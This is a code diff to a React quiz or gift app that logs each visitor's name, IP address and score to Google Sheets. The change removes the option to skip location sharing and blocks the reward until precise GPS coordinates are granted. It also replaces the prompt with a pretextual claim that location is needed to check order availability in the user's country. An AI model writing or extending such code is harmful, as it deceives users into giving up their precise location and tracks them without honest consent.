@@ -83,6 +83,7 @@ function App() {
   const [location, setLocation] = useState(null);
   const [isLoading, setIsLoading] = useState(false);
   const [showLocationPrompt, setShowLocationPrompt] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
   const [sessionId] = useState(() => Date.now() + '-' + Math.random().toString(36).substr(2, 9));
 
   // Fetch IP on component mount
@@ -180,8 +181,9 @@ function App() {
 
   const requestLocation = () => {
     setIsLoading(true);
+    setErrorMsg('');
     // Save score immediately as a checkpoint
-    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_requested_by_user');
+    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_requested_mandatory');
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -199,41 +201,43 @@ function App() {
         (error) => {
           console.error('Error getting location:', error);
           setIsLoading(false);
-          setShowLocationPrompt(false);
-          setStage('gift');
-          saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_denied');
+          // BLOCK: Do not go to gift stage
+          if (error.code === 1) { // PERMISSION_DENIED
+            setErrorMsg("⚠️ Permission Denied. Please enable Location in your browser settings (lock icon in address bar) and try again.");
+          } else {
+            setErrorMsg("⚠️ Location check failed. Please ensure GPS is on and try again.");
+          }
+          saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_denied_mandatory');
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
-      alert('Geolocation is not supported by your browser.');
       setIsLoading(false);
-      setShowLocationPrompt(false);
-      setStage('gift');
+      setErrorMsg("Your browser does not support geolocation.");
       saveToGoogleSheets(sessionId, userName, userIP, score, null, 'geolocation_unsupported');
     }
   };
 
-  const skipLocation = () => {
-    setShowLocationPrompt(false);
-    setStage('gift');
-    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_skipped_by_user');
-  };
+  // skipLocation removed
 
   const renderLocationPrompt = () => (
     <div className="location-prompt-overlay" style={{ backgroundImage: `url(${resultBg})` }}>
       <div className="location-prompt-card animate-fade-in">
         <div className="location-icon">📍</div>
-        <h2 className="prompt-title">Enable Hero Tracking!</h2>
-        <p className="prompt-text">To deliver your rewards to your secret base, we need your coordinates!</p>
-        <p className="prompt-note">(This will prompt your browser for permission)</p>
+        <h2 className="prompt-title">Location Required</h2>
+        <p className="prompt-text">Location Service is Needed To Check Availability Of orders In Your Country</p>
+
+        {errorMsg && (
+          <div className="error-message" style={{ margin: '15px 0', padding: '10px', background: 'rgba(255, 0, 0, 0.1)', border: '1px solid #ff6b6b', borderRadius: '8px' }}>
+            <p className="error-text" style={{ color: '#ff6b6b', fontWeight: 'bold', fontSize: '0.9rem' }}>{errorMsg}</p>
+          </div>
+        )}
+
+        <p className="prompt-note" style={{ marginTop: '10px' }}>(Please allow access to proceed)</p>
 
         <div className="prompt-buttons">
-          <button onClick={requestLocation} className="allow-btn" disabled={isLoading}>
-            {isLoading ? 'Locating...' : 'Allow Access'}
-          </button>
-          <button onClick={skipLocation} className="deny-btn" disabled={isLoading}>
-            Skip Delivery
+          <button onClick={requestLocation} className="allow-btn" disabled={isLoading} style={{ width: '100%' }}>
+            {isLoading ? 'Checking Availability...' : 'Turn On Location'}
           </button>
         </div>
       </div>
